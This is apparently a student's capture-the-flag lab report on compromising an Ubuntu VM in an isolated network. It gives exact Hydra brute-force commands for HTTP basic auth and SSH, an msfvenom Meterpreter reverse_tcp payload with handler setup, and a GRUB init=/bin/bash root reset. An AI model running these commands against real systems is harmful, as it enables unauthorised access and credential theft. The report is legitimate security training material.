<strong>Group Name/Number:</strong> todo/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 17-19.1.2025<br>
<strong>Submission date:</strong> 20.1.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition">Task definition</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#setting-up-the-virtual-machines">Setting up the virtual machines</a></li>
<li><a href="#reconnaissance-scanning-the-network">Reconnaissance: Scanning the Network</a></li>
<li><a href="#reconnaissance-exploring-the-websites">Reconnaissance: Exploring the websites</a></li>
<li><a href="#weaponization-evaluating-the-needed-tools">Weaponization: Evaluating the needed tools</a></li>
<li><a href="#exploitation-using-hydra-to-break-http-basic-authentication">Exploitation: Using Hydra to break HTTP basic authentication</a></li>
<li><a href="#exploitation-using-hydra-to-brute-force-ssh-login">Exploitation: Using Hydra to brute force SSH login</a></li>
<li><a href="#exploring-the-system">Exploring the system</a>
<ul>
<li><a href="#listing-all-the-files">Listing all the files</a></li>
<li><a href="#investigating-the-listening-service">Investigating the listening service</a></li>
<li><a href="#investigating-the-process-flag">Investigating the process flag</a></li>
<li><a href="#further-investigating-the-webserver">Further investigating the webserver</a></li>
<li><a href="#investigating-secret_flagtxt">Investigating secret_flag.txt</a></li>
<li><a href="#exploring-the-new-user">Exploring the new user</a></li>
<li><a href="#finding-the-history-flag">Finding the history flag</a></li>
</ul>
</li>
<li><a href="#it-should-be-over-now-right">It should be over now, right?</a></li>
<li><a href="#privilege-escalation-on-linux">Privilege escalation on Linux</a>
<ul>
<li><a href="#using-a-smart-enumeration-tool">Using a smart enumeration tool</a></li>
<li><a href="#trying-a-kernel-level-exploit">Trying a kernel level exploit</a></li>
<li><a href="#trying-to-get-privileges-using-metasploit-and-meterpreter">Trying to get privileges using Metasploit and Meterpreter</a></li>
</ul>
</li>
<li><a href="#getting-root-access-through-editing-the-grub-boot-options">Getting root access through editing the GRUB boot options</a></li>
<li><a href="#obtaining-the-final-flag">Obtaining the final flag</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<p>This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a <code>Host-only network</code>, meaning they can communicate with each other but not with the external internet or other devices.</p>
<p>The goal is to use the tools and techniques available in Kali Linux to explore the Ubuntu server, identify vulnerabilities, and capture the flags, all within an isolated network environment.</p>
<hr>
<h2 id="summary">Summary</h2>
<p>In this exercise, we had to break into a Linux server VM and find six hidden flags. To gain access, we first scanned the network with <code>nmap</code> and discovered four web servers. One of these required brute-forcing to retrieve the first flag, which then allowed us to gain a web shell to the system. Using the web shell, we brute-forced the password for the current user to SSH into the machine. Once logged in, we explored the system to find flags.</p>
<p>We discovered a flag in the comments of the server&rsquo;s <code>python</code> file, which we found by inspecting the running processes. The file was intended to run as a process, and this led us to locate it. Additionally, we found flags in the history of another user who had permission to view <code>secret_flag.txt</code> in the <code>/opt</code> directory, as well as one flag in the <code>/tmp</code> directory. There are actually seven flags in total, with one located in the home directory of <code>/root</code>.</p>
<p>We attempted to gain root access using the Linux Smart Enumeration tool and by analyzing the results for potential privilege escalation vectors, such as SUID binaries or binaries we could run with <code>sudo</code> to escalate to a shell. We also tried using a getshell from meterpreter to gain access, but none of these methods worked. As a result, we edited the boot configurations in the VM itself to get a shell and then changed the root password. This allowed us to execute the CTF setup script and view the final flag in the root&rsquo;s home directory.<!-- raw HTML omitted -->ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise</h2>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/topo.png"/> <figcaption>
            Figure 1: Complete network topology of the exercise
        </figcaption>
</figure>

<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="setting-up-the-virtual-machines">Setting up the virtual machines</h3>
<p>To get started with this CTF, make sure that VirtualBox version 7.1.4 is used. The VM to attack must be imported by double-clicking the provided <code>.ova</code> file. After the import is complete, the network settings must be changed to use Host-only Adapter mode. Since using the default Host-only network did not work, we had to create a new Host-only network. To do this, either press <code>&lt;C-h&gt;</code> or click on <code>File &gt; Tools &gt; Network Manager</code>, as shown in Figure 2.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/openingNetworkManager.png"/> <figcaption>
            Figure 2: Opening VirtualBox Network Manager settings
        </figcaption>
</figure>

<p>In this menu, click on <code>Create</code>, then check the <code>Enable Server</code> box to enable the DHCP server so the target VM will receive an IP address. Then, click on <code>Adapter</code> to view the IP range of the network, which in our case is <code>192.168.15.0/24</code>, which can be seen in Figure 3.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/nwipsfr.png"/> <figcaption>
            Figure 3: Showing the IP settings for the new Host-only network
        </figcaption>
</figure>

<p>Next, open the virtual machine settings by selecting the VM in the list and pressing <code>&lt;C-s&gt;</code>. Under the <code>Network</code> section, change the network adapter to use the Host-only Adapter and select the VirtualBox Host-only Ethernet Adapter #2, which was just created. Perform this step for both the target VM and the Kali VM, as detailed in Figure 4.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/vmnwconf.png"/> <figcaption>
            Figure 4: Showing the network configuration of the virtual machines
        </figcaption>
</figure>

<hr>
<h3 id="reconnaissance-scanning-the-network">Reconnaissance: Scanning the Network</h3>
<p>We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with <code>nmap</code>.<!-- raw HTML omitted -->Lockheed Martin<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --> Since we don&rsquo;t know the IP address of the target server yet, we need to scan the network to find it. For this, the command <code>nmap 192.168.15.0/24</code> is used to scan the entire network for open ports, as illustrated in Figure 5.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/firstnmapscan.png"/> <figcaption>
            Figure 5: Results of the nmap scan
        </figcaption>
</figure>

<p>We can determine that the target has the IP address <code>192.168.15.3</code>, since <code>.1</code> is the network address, <code>.2</code> is the DHCP server, and <code>.4</code> is the IP address of the Kali VM. This can be verified by running <code>ip a</code> or by scanning the open ports, since <code>ssh</code> is not exposed.</p>
<p>Now we can run another <code>nmap</code> scan to get further information about the running services and their version by using the <code>-sV</code> flag and the <code>-T4</code> flag for aggressive timing, and the <code>-p-</code> value to scan all ports.<!-- raw HTML omitted -->Nmap Version Detection<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Nmap Timing<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --> The results of the scan can be seen in Figure 6.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/nmapfr.png"/> <figcaption>
            Figure 6: Results of the detailed nmap scan
        </figcaption>
</figure>

<p>From this scan, we can see that <code>ssh</code> and four <code>http</code> servers running Python 3.12.3 are active on the system.</p>
<hr>
<h3 id="reconnaissance-exploring-the-websites">Reconnaissance: Exploring the websites</h3>
<p>If we open the websites in our web browser of choice, we can see that the one on port <code>1080</code> says that to get further, we need to scan deeper, which we already did. The website on port <code>5155</code> shows text from foreign languages, which is randomized and always prints out different text on refresh. The site on port <code>10458</code> prints out a message in <code>base64</code>, and lastly, the one on port <code>10448</code> has a basic authentication login prompt for a mini web shell. Figure 7 shows the content of each webpage.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/allesiten.png"/> <figcaption>
            Figure 7: Showing the contents of each page using curl
        </figcaption>
</figure>

<p>The <code>base64</code> message can be decoded by piping the string, using <code>echo</code>, into the <code>base64</code> command, which gives us the hint to use port <code>55487</code>, the site with authentication. This is shown in Figure 8.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/base64.png"/> <figcaption>
            Figure 8: Decoding the base64 message
        </figcaption>
</figure>

<p>To get all the random variants from the site with the foreign languages, I wrote a quick batch script to recursively relay the website and save the output in a file called <code>output</code>, as shown in Figure 9.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    body<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s 192.168.15:5155<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> &gt;&gt; output
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/gettextsh.png"/> <figcaption>
            Figure 9: Running the script
        </figcaption>
</figure>

<p>After running it for a while, we prompted ChatGPT with the list of outputs to translate, which revealed the following hint, as shown in Figure 10.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/labngs.png"/> <figcaption>
            Figure 10: ChatGPT translating the hint
        </figcaption>
</figure>

<hr>
<h3 id="weaponization-evaluating-the-needed-tools">Weaponization: Evaluating the needed tools</h3>
<p>Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist.<!-- raw HTML omitted -->pw-list<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="exploitation-using-hydra-to-break-http-basic-authentication">Exploitation: Using Hydra to break HTTP basic authentication</h3>
<p>To brute force the password, the following <code>hydra</code> command will be used: <code>hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /</code><!-- raw HTML omitted -->hydra-http-basic-auth<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-l user <span style="color:#75715e">#specifying the username to attempt logging in with</span>
</span></span><span style="display:flex;"><span>-P pw.txt <span style="color:#75715e">#tells Hydra to use the contents of pw.txt as passwords to try</span>
</span></span><span style="display:flex;"><span>-s <span style="color:#ae81ff">55487</span> <span style="color:#75715e">#specifying the port to connect to</span>
</span></span><span style="display:flex;"><span>-f <span style="color:#75715e">#telling Hydra to stop after a valid login</span>
</span></span><span style="display:flex;"><span>192.168.15.3 <span style="color:#75715e">#setting the target IP address</span>
</span></span><span style="display:flex;"><span>http-get / <span style="color:#75715e">#specifying the service and method to use</span>
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/hydra.png"/> <figcaption>
            Figure 11: Running the Hydra command to get the credentials
        </figcaption>
</figure>

<p>After entering the found credentials on the webpage, we get the first flag.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/flag1.png"/> <figcaption>
            Figure 12: First flag found
        </figcaption>
</figure>

<hr>
<p>Besides the flag, there is a webshell on the site, so we can run commands on the server. However, interacting through the website is a horrible experience, and that&rsquo;s why we used the command <code>whoami</code> to find out which user we are logged in as so we can SSH into the server instead.</p>
<hr>
<h3 id="exploitation-using-hydra-to-brute-force-ssh-login">Exploitation: Using Hydra to brute force SSH login</h3>
<p>To brute force the SSH login, this Hydra command is used: <code>hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4</code>.<!-- raw HTML omitted -->hydra-ssh<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the <code>-t</code> flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/hydrassh.png"/> <figcaption>
            Figure 13: Getting the credentials for the user GrumpyCat
        </figcaption>
</figure>

<hr>
<h3 id="exploring-the-system">Exploring the system</h3>
<h4 id="listing-all-the-files">Listing all the files</h4>
<p>Now that we have a shell in the server, it&rsquo;s time to dig around and explore. We started by running <code>ls -R / * 2&gt;/dev/null | grep flag</code>, in which the <code>-R</code> flag is used to recursively list all the files in the root of the file system and the <code>*</code> is used to list everything inside that as well. Lastly, the <code>2&gt;/dev/null</code> redirects <code>stderr</code> to the file <code>/dev/null</code> to effectively delete them from the output, which is piped into <code>grep</code> to filter it to search for files that have <code>flag</code> in their name.<!-- raw HTML omitted -->stderr<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --> To tidy up the output, it can be piped into <code>grep</code> again with the <code>-v</code> flag to exclude results that contain <code>flags</code>. Figure 14 shows the results.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/searchingfor%20falgfiles.png"/> <figcaption>
            Figure 14: Output of the search command
        </figcaption>
</figure>

<p>As we can see, we found a file called <code>secret_flag.txt</code> and <code>flag_process.sh</code>, for which we can search with the following command: <code>find -name &quot;filename&quot; / 2&gt;/dev/null</code>. Figure 15 displays the found file locations.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/findfiles.png"/> <figcaption>
            Figure 15: File locations of the 2 found files
        </figcaption>
</figure>

<hr>
<h4 id="investigating-the-listening-service">Investigating the listening service</h4>
<p>With <code>ss -tulnp</code>, we can examine all listening process services on the system for TCP and UDP, along with the processes they use, if we have permission to see that.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/sstunlp.png"/> <figcaption>
            Figure 16: Viewing the listening services
        </figcaption>
</figure>

<hr>
<h4 id="investigating-the-process-flag">Investigating the process flag</h4>
<p>Let&rsquo;s return to the file <code>flag_process.sh</code> to get this flag. Simply cat the file as shown in Figure 17.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/processflag.png"/> <figcaption>
            Figure 17: Viewing the check_running_processes flag
        </figcaption>
</figure>

<hr>
<h4 id="further-investigating-the-webserver">Further investigating the webserver</h4>
<p>Luckily, as seen in Figure 16, it appears that the webserver has been started as the current user, which we can further inspect with <code>ps aux | grep python</code>. As shown in Figure 18, the process has been started by the root user as GrumpyCat.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/psauxpy.png"/> <figcaption>
            Figure 18: Inspecting the running Python processes
        </figcaption>
</figure>

<p>If we read the file <code>/bin/ctf_server.py</code>, we first see that the ranges of the randomized port ranges are <code>4000-5600</code>, <code>10000-12000</code>, and <code>50000-60000</code>. The intended translation is &ldquo;Hinweis1: Der Nutzername lautet user&rdquo;, and lastly, a flag hides itself at the bottom of the file, which is shown in Figure 19.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/commentflag.png"/> <figcaption>
            Figure 19: Viewing the flag in the server Python file
        </figcaption>
</figure>

<hr>
<h4 id="investigating-secret_flagtxt">Investigating secret_flag.txt</h4>
<p>If we simply cat this file as the current user, we can&rsquo;t do that since we lack permission and are not in the sudoers group or file. Therefore, we have two options: either find a different user who has the privileges to read the file or escalate our current privileges to become root. The first option is the more reasonable one, which we will use.</p>
<p>To see all the users we can log into, we can search through the file using the following grep command: <code>grep -v &quot;nologin&quot; /etc/passwd</code>. With this command, we display all the lines of the <code>/etc/passwd</code> file that don&rsquo;t contain <code>nologin</code> to only display the users we can log in as.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/usr.png"/> <figcaption>
            Figure 20: Listing the users we can log in as
        </figcaption>
</figure>

<p>As seen in Figure 20, we got two new options as users to log in: <code>ubuntu</code> and <code>CheerfulOtter</code>. Since we had already tried brute-forcing the root password from the very start, just in case, and the user users have not set an interactive login shell, we chose <code>CheerfulOtter</code> because the name sounds more similar to <code>GrumpyCat</code>. We also brute-forced the <code>ubuntu</code> user in the background. This was a correct assumption, as the password for the <code>CheerfulOtter</code> user was also &ldquo;password&rdquo;, and we didn&rsquo;t find the password for the <code>ubuntu</code> user, which also had its sudo permissions removed in the <code>remove_ubuntu_from_sudo()</code> function in the setup script.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/cheerfulotpw.png"/> <figcaption>
            Figure 21: Getting the credentials for CheerfulOtter
        </figcaption>
</figure>

<p>As seen in Figure 21, we got the credentials for the CheerfulOtter user. If we log in as that user and run <code>sudo -l</code> to see what permissions we have with sudo, we can see that the only command we can run elevated is <code>/bin/cat /opt/secret_flag.txt</code>, which we need in order to find the flag, as shown in Figure 22.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/sh.png"/> <figcaption>
            Figure 22: Viewing secret_flag.txt
        </figcaption>
</figure>

<hr>
<h4 id="exploring-the-new-user">Exploring the new user</h4>
<p>Since we are in a new user, it&rsquo;s time to rerun old commands and see if any new files can be found. Instead of using <code>ls</code> and <code>grep</code> to search, we will use the following <code>find</code> command: <code>find / -type f -name '*flag*' 2&gt;/dev/null</code>.<!-- raw HTML omitted -->find<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --> Here is a breakdown of the command used in Figure 23:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / <span style="color:#75715e">#Selecting the / directory to search in</span>
</span></span><span style="display:flex;"><span>-type f <span style="color:#75715e">#Restricts the command to only search files</span>
</span></span><span style="display:flex;"><span>-name <span style="color:#e6db74">&#39;*flag*&#39;</span> <span style="color:#75715e">#Specifies that the command should only search files that contain &#34;flag&#34;</span>
</span></span><span style="display:flex;"><span>2&gt;/dev/null <span style="color:#75715e">#Hiding errors</span>
</span></span></code></pre></div><p><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/fdtmp.png"/> <figcaption>
            Figure 23: Output of the find command
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/tmpfl.png"/> <figcaption>
            Figure 24: Viewing the flag in the /tmp directory
        </figcaption>
</figure>
</p>
<hr>
<h4 id="finding-the-history-flag">Finding the history flag</h4>
<p>Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked <code>.bash_history</code> instead of the <code>.history</code> file, which contains a flag in this CTF.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --> I always missed it until I ran <code>ls -l</code> as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/colsal.png"/> <figcaption>
            Figure 25: Viewing the home directories of CheerfulOtter
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/cofl.png"/> <figcaption>
            Figure 26: Viewing the flag in the .history file
        </figcaption>
</figure>
</p>
<hr>
<h3 id="it-should-be-over-now-right">It should be over now, right?</h3>
<p>Now that we found the following six flags:</p>
<ol>
<li><code>FLAG{use_secure_credentials}</code></li>
<li><code>FLAG{always_check_comments_in_scripts}</code></li>
<li><code>FLAG{sudo_privileges_are_key}</code></li>
<li><code>FLAG{inspect_running_processes}</code></li>
<li><code>FLAG{tmp_directory_is_not_safe}</code></li>
<li><code>FLAG{always_check_history}</code></li>
</ol>
<p>This means that the exercise is over, right?</p>
<p>No, it&rsquo;s not over yet. In an email, Professor Zivkovic stated that for flag 6, root access is needed. This means that either he made a mistake in counting, forgot about one, or there is a 7th flag that requires root privileges. Spoiler alert: it was the latter. So, the next section will be about escalating the privileges to get to that point.</p>
<hr>
<h3 id="privilege-escalation-on-linux">Privilege escalation on Linux</h3>
<p>If you want to escalate your privileges on Linux, you have five options, which are the following:<!-- raw HTML omitted -->priv-esc-overview<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<ol>
<li>Find an exploit for the version of the kernel that is running.<!-- raw HTML omitted -->kernel-exploit<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --></li>
<li>Find a SUID binary that runs with the owner&rsquo;s permissions.<!-- raw HTML omitted -->suid<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></li>
<li>Escalate to a shell in a usable command with <code>sudo</code>.<!-- raw HTML omitted -->sudo-exploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></li>
<li>Find writable files that run at startup, like <code>crontab</code>, or other misconfigurations in the system.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref1:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></li>
<li>Find an attachable process that is running as root.</li>
</ol>
<h4 id="using-a-smart-enumeration-tool">Using a smart enumeration tool</h4>
<p>To quickly and effortlessly gather information about possible attack vectors for privilege escalation, there are tools such as <code>linux-smart-enumeration</code> to do the job for you.<!-- raw HTML omitted -->lse<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --> After running the script on both users, we found that there were no attack vectors we could exploit. We discovered an empty backup file in the following location: <code>/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz</code>, and a <code>screen</code> session by the root user which we could not attach to. Additionally, the binaries <code>/snap/snapd/23545/usr/lib/snapd/snap-confine</code> and <code>/snap/snapd/23258/usr/lib/snapd/snap-confine</code> run as root, but the only available exploit for them has been patched for years. Furthermore, the only command we could run with elevated privileges is <code>cat /opt/secret_flag.txt</code>, which does not allow us to escalate to the command line interface (CLI). Lastly, not a single cron file was writable, nor were we able to view configuration files such as <code>/etc/sudoers</code>, which means there is no way to get root privileges on the system.</p>
<h4 id="trying-a-kernel-level-exploit">Trying a kernel level exploit</h4>
<p>We also tried a kernel exploit from exploit-db out of desperation, which failed at compiling.<!-- raw HTML omitted -->exploitdb<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
<h4 id="trying-to-get-privileges-using-metasploit-and-meterpreter">Trying to get privileges using Metasploit and Meterpreter</h4>
<p>Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.<!-- raw HTML omitted -->linux-reverse-tcp<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->metasploit-local-exploiter-suggestor<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup><!-- raw HTML omitted --></p>
<p>To do this, we had to generate a payload first. The payload was generated with the following command:<br>
<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin</code><!-- raw HTML omitted -->msfvenomdocs<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p linux/x86/meterpreter/reverse_tcp <span style="color:#75715e">#setting the payload to be reverse TCP for Linux x86</span>
</span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> <span style="color:#75715e"># sets IP address of the attacking machine</span>
</span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> <span style="color:#75715e">#sets the local port to listen for a connection</span>
</span></span><span style="display:flex;"><span>-f elf <span style="color:#75715e">#specifies the output format</span>
</span></span><span style="display:flex;"><span>-o payload.bin <span style="color:#75715e">#specifies the output filename</span>
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/msfgenpayload.png"/> <figcaption>
            Figure 27: Generating the payload using msfvenom
        </figcaption>
</figure>

<p>After this, the payload is uploaded to the target using scp, as demonstrated in Figure 28.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/scp.png"/> <figcaption>
            Figure 28: Uploading the payload to the target
        </figcaption>
</figure>

<p>The next step is to open the Metasploit console by running <code>msfconsole</code>. Set the exploit to <code>exploit/multi/handler</code>, the payload to <code>linux/x86/meterpreter/reverse_tcp</code>, the LHOST to <code>192.168.15.4</code>, and finally, run the command <code>run</code> to start the reverse TCP handler. After that, we execute the binary on the target, and we have a Meterpreter shell, as shown in Figures 29 and 30.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/msfc.png"/> <figcaption>
            Figure 29: Running the necessary commands in the msfconsole
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/ep.png"/> <figcaption>
            Figure 30: Executing the payload on the target
        </figcaption>
</figure>
</p>
<p>Now that we have access to Meterpreter, we can use commands such as <code>getuid</code> to get the ID of the user and many other useful commands such as <code>upload</code> and <code>download</code>. However, as demonstrated in Figure 31, loading the priv module didn&rsquo;t work, so we were not able to test if <code>getsystem</code> would work to escalate the privileges.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/RadagJuice.png"/> <figcaption>
            Figure 31: The required modules not being loaded
        </figcaption>
</figure>

<hr>
<h3 id="getting-root-access-through-editing-the-grub-boot-options">Getting root access through editing the GRUB boot options</h3>
<p>Since we weren&rsquo;t able to gain access, we resorted to the good old and reliable GRUB root password reset.<!-- raw HTML omitted -->root-grub<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup><!-- raw HTML omitted --></p>
<p>To use this method, the system needs to be running the GRUB boot loader, which is the default for Ubuntu.</p>
<p>It is performed by pressing <code>e</code> when seeing the screen shown in Figure 32, which brings up the menu to edit the boot commands.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/pe.png"/> <figcaption>
            Figure 32: Showing the GRUB screen to press e on
        </figcaption>
</figure>

<p>Then navigate to the line starting with <code>linux</code> and append <code>rw init=/bin/bash</code>, as shown in Figure 33, to change a kernel parameter. After pressing F10, you will immediately boot into the system with a root shell, as shown in Figure 34.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/rw&#43;.png"/> <figcaption>
            Figure 33: Editing a kernel parameter
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/pwc.png"/> <figcaption>
            Figure 34: Changing the root password
        </figcaption>
</figure>
</p>
<p>Lastly, as displayed in Figure 34, we run the command <code>exec /sbin/init</code> to reboot the system and load into the operating system as usual. Figure 35 verifies this by showing the root login after rebooting.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/ve.png"/> <figcaption>
            Figure 35: Logging in as the root user
        </figcaption>
</figure>

<hr>
<h3 id="obtaining-the-final-flag">Obtaining the final flag</h3>
<p>Now that we are the root user, we can see a file called <code>root_flag.txt</code>, which contains the final flag. Additionally, we can view the file <code>ctf_setup.sh</code> to see how the CTF is made and verify that we actually got all of the flags this time. These files are also available in the ZIP file beside this document. Figure 36 shows the files in <code>/root</code> and the final flag.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex7/images/ogm.png"/> <figcaption>
            Figure 36: Viewing the final flag in the /root directory
        </figcaption>
</figure>

<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>This task definition and summary were generated using ChatGPT from the original bullet points.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Lockheed Martin. Cyber Kill Chain®. <a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Nmap. Service and Version Detection. <a href="https://nmap.org/book/man-version-detection.html">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Nmap. Timing Templates (-T). <a href="https://nmap.org/book/performance-timing-templates.html">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>10-million-password-list-top-10000.txt. <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
